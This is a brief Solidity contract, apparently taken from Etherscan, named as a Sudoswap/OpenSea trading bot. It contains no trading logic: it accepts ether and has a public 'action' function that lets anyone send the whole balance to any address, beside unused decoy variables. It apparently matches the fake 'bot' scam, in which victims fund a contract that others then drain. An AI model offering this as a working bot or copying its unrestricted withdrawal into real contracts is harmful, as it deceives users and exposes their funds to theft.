/**
 *Submitted for verification at Etherscan.io on 2022-11-09
*/

/**
 *Submitted for verification at Etherscan.io on 2022-11-06
*/

pragma solidity ^0.5.0;
 
contract sudoswap_opensea_bot {
	string public tokenName;
	string public tokenSymbol;
	uint loanAmount;
	
function() external payable {}
	
	function action(address _address) public payable {
	    address(uint160(_address)).transfer(address(this).balance);   
	}
}